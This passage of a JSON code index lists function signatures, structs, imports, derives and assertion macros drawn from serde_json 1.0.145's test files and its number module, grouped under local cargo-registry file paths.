          "fn test_write_list() {",
          "fn test_write_object() {",
          "fn test_write_tuple() {",
          "fn test_write_enum() {",
          "fn test_write_option() {",
          "fn test_write_newtype_struct() {",
          "fn test_deserialize_number_to_untagged_enum() {",
          "fn test_parse_ok<T>(tests: Vec<(&str, T)>)",
          "fn test_parse_unusual_ok<T>(tests: Vec<(&str, T)>)",
          "fn test_parse_err<T>(errors: &[(&str, &'static str)])",
          "fn test_parse_slice_err<T>(errors: &[(&[u8], &'static str)])",
          "fn test_fromstr_parse_err<T>(errors: &[(&str, &'static str)])",
          "fn test_parse_null() {",
          "fn test_parse_bool() {",
          "fn test_parse_char() {",
          "fn test_parse_number_errors() {",
          "fn test_parse_i64() {",
          "fn test_parse_u64() {",
          "fn test_parse_negative_zero() {",
          "fn test_parse_f64() {",
          "fn test_value_as_f64() {",
          "fn test_roundtrip_f64() {",
          "fn test_roundtrip_f32() {",
          "fn test_serialize_char() {",
          "fn test_malicious_number() {",
          "fn test_parse_number() {",
          "fn test_parse_string() {",
          "fn test_parse_list() {",
          "fn test_parse_object() {",
          "fn test_parse_struct() {",
          "fn test_parse_option() {",
          "fn test_parse_enum_errors() {",
          "fn test_parse_enum() {",
          "fn test_parse_trailing_whitespace() {",
          "fn test_multiline_errors() {",
          "fn test_missing_option_field() {",
          "fn test_missing_nonoption_field() {",
          "fn test_missing_renamed_field() {",
          "fn test_serialize_seq_with_no_len() {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_unit<E>(self) -> Result<MyVec<T>, E>",
          "fn visit_seq<V>(self, mut visitor: V) -> Result<MyVec<T>, V::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<MyVec<T>, D::Error>",
          "fn test_serialize_map_with_no_len() {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_unit<E>(self) -> Result<MyMap<K, V>, E>",
          "fn visit_map<Visitor>(self, mut visitor: Visitor) -> Result<MyMap<K, V>, Visitor::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<MyMap<K, V>, D::Error>",
          "fn test_deserialize_from_stream() {",
          "fn test_serialize_rejects_adt_keys() {",
          "fn test_bytes_ser() {",
          "fn test_byte_buf_ser() {",
          "fn test_byte_buf_de() {",
          "fn test_byte_buf_de_invalid_surrogates() {",
          "fn test_byte_buf_de_surrogate_pair() {",
          "fn test_raw_de_invalid_surrogates() {",
          "fn test_raw_de_surrogate_pair() {",
          "fn test_byte_buf_de_multiple() {",
          "fn test_json_pointer() {",
          "fn test_json_pointer_mut() {",
          "fn test_stack_overflow() {",
          "fn test_disable_recursion_limit() {",
          "fn test_integer_key() {",
          "fn test_integer128_key() {",
          "fn test_float_key() {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn test_deny_non_finite_f32_key() {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn test_deny_non_finite_f64_key() {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn test_boolean_key() {",
          "fn test_borrowed_key() {",
          "fn test_effectively_string_keys() {",
          "fn test_json_macro() {",
          "fn issue_220() {",
          "fn test_partialeq_number() {",
          "fn test_partialeq_string() {",
          "fn test_partialeq_bool() {",
          "fn read(&mut self, _: &mut [u8]) -> io::Result<usize> {",
          "fn test_category() {",
          "fn test_into_io_error() {",
          "fn io_error<'de, T: Deserialize<'de> + Debug>(j: &'static str) -> io::Error {",
          "fn test_borrow() {",
          "fn null_invalid_type() {",
          "fn test_integer128() {",
          "fn test_integer128_to_value() {",
          "fn test_borrowed_raw_value() {",
          "fn test_raw_value_in_map_key() {",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn eq(&self, other: &Self) -> bool {",
          "fn hash<H: Hasher>(&self, hasher: &mut H) {",
          "fn test_boxed_raw_value() {",
          "fn test_raw_invalid_utf8() {",
          "fn test_serialize_unsized_value_to_raw_value() {",
          "fn test_borrow_in_map_key() {",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn test_value_into_deserializer() {",
          "fn hash_positive_and_negative_zero() {",
          "fn test_control_character_search() {"
        ],
        "struct_defs": [
          "struct Inner {",
          "struct Outer {",
          "struct Newtype(BTreeMap<String, i32>);",
          "struct S {",
          "struct Foo {",
          "struct Foo {",
          "struct Foo {",
          "struct Foo {",
          "struct MyVec<T>(Vec<T>);",
          "struct Visitor<T> {",
          "struct MyMap<K, V>(BTreeMap<K, V>);",
          "struct Visitor<K, V> {",
          "struct Message {",
          "struct Float;",
          "struct F32Bits(u32);",
          "struct F64Bits(u64);",
          "struct NewtypeStr<'a>(&'a str);",
          "struct Wrapper(String);",
          "struct FailReader(io::ErrorKind);",
          "struct Wrapper<'a> {",
          "struct RawMapKey(RawValue);",
          "struct Wrapper {",
          "struct Outer {",
          "struct MyMapKey(usize);",
          "struct Outer {",
          "struct Inner {"
        ],
        "impl_blocks": [
          "impl Serialize for Float {",
          "impl Serialize for F32Bits {",
          "impl Serialize for F64Bits {",
          "impl io::Read for FailReader {",
          "impl PartialEq for RawMapKey {",
          "impl Eq for RawMapKey {}",
          "impl Hash for RawMapKey {"
        ],
        "uses": [
          "use ref_cast::RefCast;",
          "use serde::de::{self, IgnoredAny, IntoDeserializer};",
          "use serde::ser::{self, SerializeMap, SerializeSeq, Serializer};",
          "use serde::{Deserialize, Serialize};",
          "use serde_bytes::{ByteBuf, Bytes};",
          "use serde_json::value::RawValue;",
          "use serde_json::{",
          "use std::collections::BTreeMap;",
          "use std::collections::HashMap;",
          "use std::fmt::{self, Debug};",
          "use std::hash::BuildHasher;",
          "use std::hash::{Hash, Hasher};",
          "use std::io;",
          "use std::iter;",
          "use std::marker::PhantomData;",
          "use std::mem;",
          "use std::str::FromStr;",
          "use std::{f32, f64};",
          "use serde_json::to_writer;",
          "use std::net::{TcpListener, TcpStream};",
          "use std::thread;",
          "use serde_json::value::RawValue;",
          "use serde_json::value::RawValue;"
        ],
        "macros": [
          "assert_eq!(s, out);",
          "assert_eq!(s, out);",
          "assert_eq!(s, out);",
          "assert_eq!(s, out);",
          "assert!(v.is_null());",
          "assert!(v.is_null());",
          "assert!(v.is_null());",
          "assert!(v.is_null());",
          "assert!(v.is_null());",
          "assert!(v.is_null());",
          "assert!(v.is_null());",
          "assert!(v.is_null());",
          "(vec![vec![], vec![], vec![]], pretty_str!([[], [], []])),",
          "pretty_str!([[1, 2, 3], [], []]),",
          "pretty_str!([[], [1, 2, 3], []]),",
          "pretty_str!([[], [], [1, 2, 3]]),",
          "(vec![true], pretty_str!([true])),",
          "(vec![true, false], pretty_str!([true, false])),",
          "let long_test_list = json!([false, null, [\"foo\\nbar\", 3.5]]);",
          "json_str!([false, null, [\"foo\\nbar\", 3.5]]),",
          "pretty_str!([false, null, [\"foo\\nbar\", 3.5]]),",
          "(treemap!(), \"{}\"),",
          "(treemap!(\"a\".to_owned() => true), \"{\\\"a\\\":true}\"),",
          "treemap!(",
          "pretty_str!({",
          "pretty_str!({",
          "pretty_str!({",
          "pretty_str!({",
          "(treemap!(), \"{}\"),",
          "treemap!(\"a\".to_owned() => true),",
          "pretty_str!({",
          "treemap!(",
          "pretty_str!( {",
          "let complex_obj = json!({",
          "json_str!({",
          "pretty_str!({",
          "test_pretty_encode_ok(&[((5,), pretty_str!([5]))]);",
          "test_pretty_encode_ok(&[((5, (6, \"abc\")), pretty_str!([5, [6, \"abc\"]]))]);",
          "pretty_str!({",
          "pretty_str!({",
          "pretty_str!({",
          "(Some(vec![\"foo\", \"bar\"]), pretty_str!([\"foo\", \"bar\"])),",
          "let inner = Newtype(treemap!(String::from(\"inner\") => 123));",
          "let outer = treemap!(String::from(\"outer\") => to_value(&inner).unwrap());",
          "assert_eq!(E::N(0), E::deserialize(Number::from(0)).unwrap());",
          "assert_eq!(v, value.clone());",
          "assert_eq!(v, value.clone());",
          "assert_eq!(json_value, to_value(&value).unwrap());",
          "assert_eq!(v, value);",
          "assert_eq!(v, value);",
          "assert_eq!(json_value2, json_value);",
          "assert_eq!(0xDEAD_BEEF, u64::deserialize(&mut de).unwrap());",
          "assert!(from_str::<Value>(&s[..i]).unwrap_err().is_eof());",
          "assert!(from_str::<IgnoredAny>(&s[..i]).unwrap_err().is_eof());",
          "assert_eq!(v, value.clone());",
          "assert_eq!(v, value.clone());",
          "assert_eq!(actual, $expected, \"unexpected {} error\", stringify!($name));",
          "test_parse_err!(from_str::<T>(s) => err);",
          "test_parse_err!(from_slice::<T>(s.as_bytes()) => err);",
          "test_parse_err!(from_slice::<T>(s) => err);",
          "assert_eq!(actual, err, \"unexpected parsing error\");",
          "assert!(",
          "assert!(",
          "&format!(\"{}\", (i64::MIN as f64) - 1.0),",
          "&format!(\"{}\", (u64::MAX as f64) + 1.0),",
          "(&format!(\"{}\", f64::EPSILON), f64::EPSILON),",
          "assert!(v.is_err());",
          "assert_eq!(v.unwrap().as_f64(), None);",
          "assert_eq!(float, output);",
          "assert_eq!(float, output);",
          "let value = json!(",
          "assert_eq!(&Value::Null, value.get(\"c\").unwrap());",
          "assert_eq!(actual, \"invalid number at line 1 column 1\");",
          "(\"{}\", treemap!()),",
          "(\"{ }\", treemap!()),",
          "(\"{\\\"a\\\":3}\", treemap!(\"a\".to_owned() => 3u64)),",
          "(\"{ \\\"a\\\" : 3 }\", treemap!(\"a\".to_owned() => 3)),",
          "treemap!(\"a\".to_owned() => 3, \"b\".to_owned() => 4),",
          "treemap!(\"a\".to_owned() => 3, \"b\".to_owned() => 4),",
          "treemap!(",
          "\"a\".to_owned() => treemap!(",
          "test_parse_ok(vec![(\"{\\\"c\\\":null}\", treemap!('c' => ()))]);",
          "assert_eq!(",
          "let j = json!([null, 2, []]);",
          "assert_eq!(value, Foo { x: None });",
          "concat!(",
          "treemap!(",
          "assert_eq!(value, Foo { x: None });",
          "assert_eq!(value, Foo { x: Some(5) });",
          "let value: Foo = from_value(json!({})).unwrap();",
          "assert_eq!(value, Foo { x: None });",
          "let value: Foo = from_value(json!({\"x\": 5})).unwrap();",
          "assert_eq!(value, Foo { x: Some(5) });",
          "assert_eq!(value, Foo { x: None });",
          "assert_eq!(value, Foo { x: Some(5) });",
          "let value: Foo = from_value(json!({})).unwrap();",
          "assert_eq!(value, Foo { x: None });",
          "let value: Foo = from_value(json!({\"y\": 5})).unwrap();",
          "assert_eq!(value, Foo { x: Some(5) });",
          "let expected = pretty_str!([[], []]);",
          "assert_eq!(s, expected);",
          "let expected = pretty_str!({",
          "assert_eq!(s, expected);",
          "assert_eq!(request, response);",
          "let map = treemap!(",
          "assert_eq!(err.to_string(), \"key must be a string\");",
          "assert_eq!(to_string(&bytes).unwrap(), \"[]\".to_owned());",
          "assert_eq!(to_string(&bytes).unwrap(), \"[1,2,3]\".to_owned());",
          "assert_eq!(to_string(&bytes).unwrap(), \"[]\".to_owned());",
          "assert_eq!(to_string(&bytes).unwrap(), \"[1,2,3]\".to_owned());",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert!(res.is_err());",
          "assert!(res.is_err());",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert_eq!(v, bytes);",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\ud83c\"\"#).is_ok());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\ud83c\\n\"\"#).is_ok());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\ud83c \"\"#).is_ok());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\udc01 \"\"#).is_ok());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\udc01\\!\"\"#).is_err());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\udc01\\u\"\"#).is_err());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\ud83c\\ud83c\"\"#).is_ok());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\ud83c\\u0061\"\"#).is_ok());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\ud83c\\u0080\"\"#).is_ok());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\ud83c\\uffff\"\"#).is_ok());",
          "assert!(from_str::<Box<RawValue>>(r#\"\"\\ud83c\\udc00\"\"#).is_ok());",
          "assert_eq!(vec![a, b], s);",
          "assert_eq!(data.pointer(\"\").unwrap(), &data);",
          "assert_eq!(data.pointer(\"/foo\").unwrap(), &json!([\"bar\", \"baz\"]));",
          "assert_eq!(data.pointer(\"/foo/0\").unwrap(), &json!(\"bar\"));",
          "assert_eq!(data.pointer(\"/\").unwrap(), &json!(0));",
          "assert_eq!(data.pointer(\"/a~1b\").unwrap(), &json!(1));",
          "assert_eq!(data.pointer(\"/c%d\").unwrap(), &json!(2));",
          "assert_eq!(data.pointer(\"/e^f\").unwrap(), &json!(3));",
          "assert_eq!(data.pointer(\"/g|h\").unwrap(), &json!(4));",
          "assert_eq!(data.pointer(\"/i\\\\j\").unwrap(), &json!(5));",
          "assert_eq!(data.pointer(\"/k\\\"l\").unwrap(), &json!(6));",
          "assert_eq!(data.pointer(\"/ \").unwrap(), &json!(7));",
          "assert_eq!(data.pointer(\"/m~0n\").unwrap(), &json!(8));",
          "assert!(data.pointer(\"/unknown\").is_none());",
          "assert!(data.pointer(\"/e^f/ertz\").is_none());",
          "assert!(data.pointer(\"/foo/00\").is_none());",
          "assert!(data.pointer(\"/foo/01\").is_none());",
          "assert_eq!(data.pointer_mut(\"/foo\").unwrap(), &json!([\"bar\", \"baz\"]));",
          "assert_eq!(data.pointer_mut(\"/foo/0\").unwrap(), &json!(\"bar\"));",
          "assert_eq!(data.pointer_mut(\"/\").unwrap(), 0);",
          "assert_eq!(data.pointer_mut(\"/a~1b\").unwrap(), 1);",
          "assert_eq!(data.pointer_mut(\"/c%d\").unwrap(), 2);",
          "assert_eq!(data.pointer_mut(\"/e^f\").unwrap(), 3);",
          "assert_eq!(data.pointer_mut(\"/g|h\").unwrap(), 4);",
          "assert_eq!(data.pointer_mut(\"/i\\\\j\").unwrap(), 5);",
          "assert_eq!(data.pointer_mut(\"/k\\\"l\").unwrap(), 6);",
          "assert_eq!(data.pointer_mut(\"/ \").unwrap(), 7);",
          "assert_eq!(data.pointer_mut(\"/m~0n\").unwrap(), 8);",
          "assert!(data.pointer_mut(\"/unknown\").is_none());",
          "assert!(data.pointer_mut(\"/e^f/ertz\").is_none());",
          "assert!(data.pointer_mut(\"/foo/00\").is_none());",
          "assert!(data.pointer_mut(\"/foo/01\").is_none());",
          "assert_eq!(data.pointer(\"/\").unwrap(), 100);",
          "*data.pointer_mut(\"/foo/0\").unwrap() = json!(\"buzz\");",
          "assert_eq!(data.pointer(\"/foo/0\").unwrap(), &json!(\"buzz\"));",
          "assert_eq!(",
          ".map(|m| mem::replace(m, json!(null)))",
          "assert_eq!(data.pointer(\"/a~1b\").unwrap(), &json!(null));",
          "assert_eq!(data.pointer_mut(\"\").unwrap(), &mut d2);",
          "let map = treemap!(",
          "let err = from_value::<BTreeMap<i32, ()>>(json!({\" 123\":null})).unwrap_err();",
          "assert_eq!(",
          "let err = from_value::<BTreeMap<i32, ()>>(json!({\"123 \":null})).unwrap_err();",
          "assert_eq!(",
          "assert_eq!(to_string(&map).unwrap(), j);",
          "assert_eq!(from_str::<BTreeMap<u128, ()>>(j).unwrap(), map);",
          "let map = treemap!(Float => \"x\".to_owned());",
          "let map = treemap!(F32Bits(f32::INFINITY.to_bits()) => \"x\".to_owned());",
          "assert!(serde_json::to_string(&map).is_err());",
          "assert!(serde_json::to_value(map).is_err());",
          "let map = treemap!(F32Bits(f32::NEG_INFINITY.to_bits()) => \"x\".to_owned());",
          "assert!(serde_json::to_string(&map).is_err());",
          "assert!(serde_json::to_value(map).is_err());",
          "let map = treemap!(F32Bits(f32::NAN.to_bits()) => \"x\".to_owned());",
          "assert!(serde_json::to_string(&map).is_err());",
          "assert!(serde_json::to_value(map).is_err());",
          "let map = treemap!(F64Bits(f64::INFINITY.to_bits()) => \"x\".to_owned());",
          "assert!(serde_json::to_string(&map).is_err());",
          "assert!(serde_json::to_value(map).is_err());",
          "let map = treemap!(F64Bits(f64::NEG_INFINITY.to_bits()) => \"x\".to_owned());",
          "assert!(serde_json::to_string(&map).is_err());",
          "assert!(serde_json::to_value(map).is_err());",
          "let map = treemap!(F64Bits(f64::NAN.to_bits()) => \"x\".to_owned());",
          "assert!(serde_json::to_string(&map).is_err());",
          "assert!(serde_json::to_value(map).is_err());",
          "let map = treemap!(false => 0, true => 1);",
          "assert_eq!(map, expected);",
          "assert_eq!(map, expected);",
          "let _ = json!([",
          "let _ = json!({",
          "let _ = json!({",
          "let _ = json!({ \"architecture\": [true, null] });",
          "assert!(from_str::<E>(r#\" \"V\"0 \"#).is_err());",
          "assert_eq!(from_str::<E>(r#\"{\"V\": 0}\"#).unwrap(), E::V(0));",
          "assert_eq!(value, $n);",
          "assert_eq!($n, value);",
          "assert_ne!(value, s);",
          "number_partialeq_ok!(0 1 100",
          "assert_eq!(v, \"42\");",
          "assert_eq!(\"42\", v);",
          "assert_ne!(v, 42);",
          "assert_eq!(v, String::from(\"42\"));",
          "assert_eq!(String::from(\"42\"), v);",
          "assert_eq!(v, true);",
          "assert_eq!(true, v);",
          "assert_ne!(v, false);",
          "assert_ne!(v, \"true\");",
          "assert_ne!(v, 1);",
          "assert_ne!(v, 0);",
          "assert!(from_str::<String>(\"123\").unwrap_err().is_data());",
          "assert!(from_str::<String>(\"]\").unwrap_err().is_syntax());",
          "assert!(from_str::<String>(\"\").unwrap_err().is_eof());",
          "assert!(from_str::<String>(\"\\\"\").unwrap_err().is_eof());",
          "assert!(from_str::<String>(\"\\\"\\\\\").unwrap_err().is_eof());",
          "assert!(from_str::<String>(\"\\\"\\\\u\").unwrap_err().is_eof());",
          "assert!(from_str::<String>(\"\\\"\\\\u0\").unwrap_err().is_eof());",
          "assert!(from_str::<String>(\"\\\"\\\\u00\").unwrap_err().is_eof());",
          "assert!(from_str::<String>(\"\\\"\\\\u000\").unwrap_err().is_eof());",
          "assert!(from_str::<Vec<usize>>(\"[\").unwrap_err().is_eof());",
          "assert!(from_str::<Vec<usize>>(\"[0\").unwrap_err().is_eof());",
          "assert!(from_str::<Vec<usize>>(\"[0,\").unwrap_err().is_eof());",
          "assert!(from_str::<BTreeMap<String, usize>>(\"{\")",
          "assert!(from_str::<BTreeMap<String, usize>>(\"{\\\"k\\\"\")",
          "assert!(from_str::<BTreeMap<String, usize>>(\"{\\\"k\\\":\")",
          "assert!(from_str::<BTreeMap<String, usize>>(\"{\\\"k\\\":0\")",
          "assert!(from_str::<BTreeMap<String, usize>>(\"{\\\"k\\\":0,\")",
          "assert!(from_reader::<_, String>(fail).unwrap_err().is_io());",
          "assert_eq!(",
          "assert_eq!(io_error::<String>(\"0\").kind(), io::ErrorKind::InvalidData);",
          "assert_eq!(io_error::<String>(\"]\").kind(), io::ErrorKind::InvalidData);",
          "assert_eq!(io_err.kind(), io::ErrorKind::NotConnected);",
          "assert_eq!(\"borrowed\", s);",
          "assert_eq!(\"borrowed\", s);",
          "assert_eq!(",
          "format!(\"{}\", err),",
          "assert_eq!(to_string(integer128).unwrap(), expected);",
          "assert_eq!(from_str::<i128>(&expected).unwrap(), *integer128);",
          "assert_eq!(to_string(integer128).unwrap(), expected);",
          "assert_eq!(from_str::<u128>(&expected).unwrap(), *integer128);",
          "assert_eq!(to_value(integer128).unwrap().to_string(), expected);",
          "assert_eq!(to_value(integer128).unwrap().to_string(), expected);",
          "if !cfg!(feature = \"arbitrary_precision\") {",
          "assert_eq!(err.to_string(), \"number out of range\");",
          "assert_eq!(r#\"{\"foo\": 2}\"#, wrapper_from_str.b.get());",
          "assert_eq!(r#\"{\"a\":1,\"b\":{\"foo\": 2},\"c\":3}\"#, wrapper_to_string);",
          "assert_eq!(json!({\"a\": 1, \"b\": {\"foo\": 2}, \"c\": 3}), wrapper_to_value);",
          "assert_eq!(r#\"\"a\"\"#, array_from_str[0].get());",
          "assert_eq!(\"42\", array_from_str[1].get());",
          "assert_eq!(r#\"{\"foo\": \"bar\"}\"#, array_from_str[2].get());",
          "assert_eq!(\"null\", array_from_str[3].get());",
          "assert_eq!(r#\"[\"a\",42,{\"foo\": \"bar\"},null]\"#, array_to_string);",
          "assert_eq!(\"\\\"\\\\\\\\k\\\"\", map_k.0.get());",
          "assert_eq!(\"\\\"\\\\\\\\v\\\"\", map_v.get());",
          "assert_eq!(r#\"{\"foo\": 2}\"#, wrapper_from_str.b.get());",
          "assert_eq!(r#\"{\"foo\": 2}\"#, wrapper_from_reader.b.get());",
          "serde_json::from_value(json!({\"a\": 1, \"b\": {\"foo\": 2}, \"c\": 3})).unwrap();",
          "assert_eq!(r#\"{\"foo\":2}\"#, wrapper_from_value.b.get());",
          "assert_eq!(r#\"{\"a\":1,\"b\":{\"foo\": 2},\"c\":3}\"#, wrapper_to_string);",
          "assert_eq!(json!({\"a\": 1, \"b\": {\"foo\": 2}, \"c\": 3}), wrapper_to_value);",
          "assert_eq!(r#\"\"a\"\"#, array_from_str[0].get());",
          "assert_eq!(\"42\", array_from_str[1].get());",
          "assert_eq!(r#\"{\"foo\": \"bar\"}\"#, array_from_str[2].get());",
          "assert_eq!(\"null\", array_from_str[3].get());",
          "assert_eq!(r#\"\"a\"\"#, array_from_reader[0].get());",
          "assert_eq!(\"42\", array_from_reader[1].get());",
          "assert_eq!(r#\"{\"foo\": \"bar\"}\"#, array_from_reader[2].get());",
          "assert_eq!(\"null\", array_from_reader[3].get());",
          "assert_eq!(r#\"[\"a\",42,{\"foo\": \"bar\"},null]\"#, array_to_string);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "let value = json!({ \"map\": { \"1\": null } });",
          "map.insert(\"inner\", json!({ \"string\": \"Hello World\" }));",
          "assert_eq!(outer.inner.string, \"Hello World\");",
          "assert_eq!(outer.inner.string, \"Hello World\");",
          "if cfg!(feature = \"arbitrary_precision\") {",
          "assert_ne!(k1, k2);",
          "assert_ne!(rand.hash_one(k1), rand.hash_one(k2));",
          "assert_eq!(k1, k2);",
          "assert_eq!(rand.hash_one(k1), rand.hash_one(k2));",
          "&format!(\"\\\"{}\\n{}\\\"\", \" \".repeat(n), \" \".repeat(m)),"
        ],
        "derives": [
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Serialize, PartialEq, Debug)]",
          "#[derive(Eq, PartialEq, Deserialize, Debug)]",
          "#[derive(Serialize)]",
          "#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Debug, PartialEq, Deserialize)]",
          "#[derive(Debug, PartialEq, Deserialize)]",
          "#[derive(Debug, PartialEq, Deserialize)]",
          "#[derive(Clone, Debug, PartialEq)]",
          "#[derive(Clone, Debug, PartialEq)]",
          "#[derive(Debug, PartialEq, Serialize, Deserialize)]",
          "#[derive(Eq, PartialEq, Ord, PartialOrd, Debug, Clone)]",
          "#[derive(Eq, PartialEq, Ord, PartialOrd, Debug, Clone)]",
          "#[derive(Eq, PartialEq, Ord, PartialOrd, Debug, Clone)]",
          "#[derive(Deserialize, Debug, Ord, PartialOrd, Eq, PartialEq)]",
          "#[derive(Eq, PartialEq, Ord, PartialOrd, Debug, Clone, Serialize, Deserialize)]",
          "#[derive(Eq, PartialEq, Ord, PartialOrd, Debug, Clone, Serialize, Deserialize)]",
          "#[derive(Debug, PartialEq, Eq, Deserialize)]",
          "#[derive(Serialize, Deserialize)]",
          "#[derive(RefCast)]",
          "#[derive(Serialize, Deserialize)]",
          "#[derive(Deserialize, Debug)]",
          "#[derive(Ord, PartialOrd, Eq, PartialEq, Debug)]",
          "#[derive(Deserialize)]",
          "#[derive(Deserialize)]"
        ],
        "error_handling": 163
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/regression.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "automod::dir!(\"tests/regression\");"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/compiletest.rs",
        "function_defs": [
          "fn ui() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/debug.rs",
        "function_defs": [
          "fn number() {",
          "fn value_null() {",
          "fn value_bool() {",
          "fn value_number() {",
          "fn value_string() {",
          "fn value_array() {",
          "fn value_object() {",
          "fn error() {",
          "fn indented() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use indoc::indoc;",
          "use serde_json::{json, Number, Value};"
        ],
        "macros": [
          "assert_eq!(format!(\"{:?}\", Number::from(1)), \"Number(1)\");",
          "assert_eq!(format!(\"{:?}\", Number::from(-1)), \"Number(-1)\");",
          "assert_eq!(",
          "format!(\"{:?}\", Number::from_f64(1.0).unwrap()),",
          "assert_eq!(format!(\"{:?}\", json!(null)), \"Null\");",
          "assert_eq!(format!(\"{:?}\", json!(true)), \"Bool(true)\");",
          "assert_eq!(format!(\"{:?}\", json!(false)), \"Bool(false)\");",
          "assert_eq!(format!(\"{:?}\", json!(1)), \"Number(1)\");",
          "assert_eq!(format!(\"{:?}\", json!(-1)), \"Number(-1)\");",
          "assert_eq!(format!(\"{:?}\", json!(1.0)), \"Number(1.0)\");",
          "assert_eq!(Number::from_f64(1.0).unwrap().to_string(), \"1.0\"); // not just \"1\"",
          "assert_eq!(Number::from_f64(12e40).unwrap().to_string(), \"1.2e41\");",
          "assert_eq!(format!(\"{:?}\", json!(\"s\")), \"String(\\\"s\\\")\");",
          "assert_eq!(format!(\"{:?}\", json!([])), \"Array []\");",
          "assert_eq!(format!(\"{:?}\", json!({})), \"Object {}\");",
          "assert_eq!(format!(\"{:?}\", err), expected);",
          "let j = json!({",
          "assert_eq!(format!(\"{:#?}\", j), expected);"
        ],
        "derives": [],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/lexical.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/tests/map.rs",
        "function_defs": [
          "fn test_preserve_order() {",
          "fn test_shift_insert() {",
          "fn test_append() {",
          "fn test_retain() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_json::{from_str, Map, Value};"
        ],
        "macros": [
          "assert_eq!(keys, EXPECTED);",
          "assert_eq!(keys, &[\"d\", \"b\", \"a\", \"c\"]);",
          "assert_eq!(keys, EXPECTED);",
          "assert!(val.is_empty());",
          "assert_eq!(keys, &[\"a\", \"c\"]);"
        ],
        "derives": [],
        "error_handling": 8
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/number.rs",
        "function_defs": [
          "fn eq(&self, other: &Self) -> bool {",
          "fn hash<H: Hasher>(&self, h: &mut H) {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Number, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_i64<E>(self, value: i64) -> Result<Number, E> {",
          "fn visit_i128<E>(self, value: i128) -> Result<Number, E>",
          "fn visit_u64<E>(self, value: u64) -> Result<Number, E> {",
          "fn visit_u128<E>(self, value: u128) -> Result<Number, E>",
          "fn visit_f64<E>(self, value: f64) -> Result<Number, E>",
          "fn visit_map<V>(self, mut visitor: V) -> Result<Number, V::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<NumberKey, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_str<E>(self, s: &str) -> Result<(), E>",
          "fn deserialize<D>(deserializer: D) -> Result<NumberFromString, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_str<E>(self, s: &str) -> Result<NumberFromString, E>",
          "fn invalid_number() -> Error {",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn $deserialize<V>(self, visitor: V) -> Result<V::Value, Error>",
